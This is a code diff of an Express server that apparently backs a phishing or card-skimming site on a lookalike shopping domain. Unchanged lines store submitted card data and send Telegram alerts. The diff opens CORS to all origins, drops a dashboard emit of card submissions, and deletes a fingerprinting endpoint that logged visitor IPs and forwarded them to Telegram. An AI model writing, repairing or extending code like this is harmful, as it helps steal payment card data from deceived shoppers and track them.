@@ -42,7 +42,7 @@ const DATA_FILE = path.join(__dirname, 'card-data.json');
 
 // Middleware
 app.use(cors({
-  origin: ['https://pandabuycn.com', 'https://www.pandabuycn.com', 'http://localhost:3000'],
+  origin: true, // Allow all origins for now
   methods: ['GET', 'POST', 'DELETE'],
   credentials: true
 })); // Enable CORS for cross-origin requests
@@ -126,8 +126,7 @@ app.post('/api/cards', (req, res) => {
       console.log('❌ Telegram notification skipped - conditions not met');
     }
 
-    // Emit to real-time dashboard
-    io.emit('card_submission', newCard);
+    // Real-time dashboard removed
     
     res.status(201).json({ success: true, message: 'Card data saved successfully' });
   } catch (error) {
@@ -178,55 +177,7 @@ app.get('/admin-visits', (req, res) => {
   res.sendFile(path.join(__dirname, 'admin-visits.html'));
 });
 
-// Fingerprinting endpoints
-app.post('/api/fingerprint', (req, res) => {
-  try {
-    const fingerprintData = {
-      ...req.body,
-      serverTimestamp: new Date().toISOString(),
-      ip: req.ip || req.connection.remoteAddress || 'unknown'
-    };
-
-    // Save fingerprint data
-    let fingerprints = [];
-    try {
-      fingerprints = JSON.parse(fs.readFileSync(FINGERPRINTS_FILE, 'utf8'));
-    } catch (readError) {
-      console.error('Error reading fingerprints data:', readError);
-    }
-
-    fingerprints.push(fingerprintData);
-    
-    // Keep only last 1000 fingerprints
-    if (fingerprints.length > 1000) {
-      fingerprints = fingerprints.slice(-1000);
-    }
-
-    fs.writeFileSync(FINGERPRINTS_FILE, JSON.stringify(fingerprints, null, 2));
-
-    // Add to active visitors
-    activeVisitors.set(fingerprintData.sessionId, {
-      ...fingerprintData,
-      joinTime: Date.now(),
-      lastActivity: Date.now()
-    });
-
-    console.log(`🕵️ New fingerprint: ${fingerprintData.sessionId} from ${fingerprintData.fingerprint?.network?.ip || 'unknown'}`);
-
-    // Send to Telegram
-    if (telegramBot) {
-      sendVisitorNotificationToTelegram(fingerprintData);
-    }
-
-    // Emit to real-time dashboard
-    io.emit('new_visitor', fingerprintData);
-
-    res.json({ success: true, message: 'Fingerprint recorded' });
-  } catch (error) {
-    console.error('Error processing fingerprint:', error);
-    res.status(500).json({ error: 'Failed to process fingerprint' });
-  }
-});
+// Removed fingerprinting - no longer needed
 
 // Removed tracking endpoint - no longer needed
 
